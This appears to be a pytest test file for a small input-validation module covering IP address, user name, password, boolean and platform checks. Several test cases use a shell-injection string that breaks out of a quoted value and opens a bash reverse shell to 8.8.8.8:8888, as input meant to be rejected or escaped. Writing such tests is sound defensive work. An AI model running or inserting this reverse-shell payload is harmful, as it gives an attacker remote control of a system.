from validator import ip_address, user_name, password, boolean, platform, MAX_PASSWD_LEN
from shlex import quote

import pytest


@pytest.mark.parametrize('value', ['0.0.0.0', '255.255.255.255', '1.1.1.1'])
def test_ip_address_must_not_raise_if_valid_value_provided(value):
    assert ip_address(value) == value


@pytest.mark.parametrize('value', ['\'; /bin/bash -i &> /dev/tcp/8.8.8.8/8888 0<&1 #', '0.0.0', '1.1.1.1/24', '11a.22.22.22', '127.0.0.1'])
def test_ip_address_must_raise_value_error_if_invalid_value_provided(value):
    with pytest.raises(ValueError):
        ip_address(value)


def test_user_name_must_accept_only_root():
    assert user_name('root') == 'root'


@pytest.mark.parametrize('value', ['root1', 'asdf', 'name'])
def test_user_name_must_allow_only_root(value):
    with pytest.raises(ValueError):
        user_name(value)


def test_password_must_be_under_32_characters_len_instead_must_raise():
    with pytest.raises(ValueError):
        password('*' * (MAX_PASSWD_LEN + 1))


@pytest.mark.parametrize('value, expected', [('*' * MAX_PASSWD_LEN, quote('*' * MAX_PASSWD_LEN)),
                                             ('\'p\'a\'s\'s\'w\'o\'r\'d\'', quote('\'p\'a\'s\'s\'w\'o\'r\'d\'')),
                                             ('Passw0rd', 'Passw0rd'),
                                             ('\'; /bin/bash -i &> /dev/tcp/8.8.8.8/8888 0<&1 #', quote('\'; /bin/bash -i &> /dev/tcp/8.8.8.8/8888 0<&1 #'))])
def test_password_must_eliminate_single_quote_in_other_cases_must_leave_value_unchanged(value, expected):
    assert password(value) == expected


@pytest.mark.parametrize('value, expected', [('\'; /bin/bash -i &> /dev/tcp/8.8.8.8/8888 0<&1 #', True),
                                             ('0', True), ('1', True), ('', False)])
def test_boolean_all_none_empty_strings_are_true_and_empty_is_false(value, expected):
    assert boolean(value) == expected


@pytest.mark.parametrize('value', ['linux', 'none'])
def test_platform_must_allow_only_linux_and_none(value):
    assert platform(value) == value


def test_platform_must_raise_if_non_acceptable_value():
    with pytest.raises(ValueError):
        platform('asdf')
